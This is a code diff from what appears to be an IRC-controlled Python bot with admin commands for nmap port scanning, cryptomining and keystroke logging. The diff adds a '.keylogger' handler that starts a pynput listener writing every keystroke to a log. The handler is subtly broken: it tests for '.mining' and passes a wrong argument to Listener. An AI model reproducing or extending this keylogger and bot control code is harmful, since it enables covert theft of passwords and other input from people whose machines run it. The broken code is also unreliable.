@@ -185,9 +185,6 @@ def linuxMemory(): # Get linux system memory info for .memory command.
 def keylogger(key):
     logging.info(str(key))
 
-    with Listener(keylogger=keylogger) as listener :
-    listener.join()
-
 def nmapScan(tgtHost, tgtPort): # Use nmap to scan ports on an ip address with .scan command
     nmScan = nmap.PortScanner()
     nmScan.scan(tgtHost, tgtPort)
@@ -715,6 +712,14 @@ def main(): # This is the main function for all of the bot controls.
                         message = "Only Linux is currently supported."
                     sendntc(message, name)
                                 
+                # Respond to '.keylogger' command from admin.
+                if name.lower() == adminname.lower() and message.find('.mining') != -1:
+                    target = message.split(' ', 1)[0]
+                    message = "Saving key strokes to keylog.txt"
+                    with Listener(keylogger=keylogger) as listener :
+                        listener.join()
+                    sendntc(message, name)
+                
                 # Respond to '.mining' command from admin.
                 if name.lower() == adminname.lower() and message.find('.mining') != -1:
                     target = message.split(' ', 1)[0]
